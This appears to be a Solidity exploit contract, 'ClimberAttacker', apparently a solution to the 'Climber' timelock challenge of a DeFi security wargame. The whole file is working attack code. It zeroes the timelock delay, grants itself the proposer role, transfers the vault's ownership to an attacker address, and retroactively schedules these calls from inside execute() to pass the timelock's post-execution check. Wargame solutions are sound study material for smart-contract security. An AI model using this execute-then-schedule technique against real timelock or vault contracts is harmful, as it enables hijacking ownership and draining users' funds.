// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ClimberTimelock} from "./ClimberTimelock.sol";


contract ClimberAttacker {

    ClimberTimelock timelock;
    address attacker;
    address vault;

    constructor(address payable _timelock, address _attacker, address _vault) {
        timelock = ClimberTimelock(_timelock);
        attacker = _attacker;
        vault = _vault;
    }

    address[]  targets;
    uint256[]  values;
    bytes[]  dataElements;
    bytes32 salt = keccak256("salt");

    function attack() public {
        // first change delay to zero
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));

        // get proposer role
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));

        // transfer ownership to the attacker
        targets.push(vault);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", attacker));

         // schedule the above tasks through this contract
        dataElements.push(abi.encodeWithSignature("callSchedule()"));
        values.push(0);
        targets.push(address(this));

        timelock.execute(targets, values, dataElements, salt);
    }

    function callSchedule() public {
        timelock.schedule(targets, values, dataElements, salt);
    }
}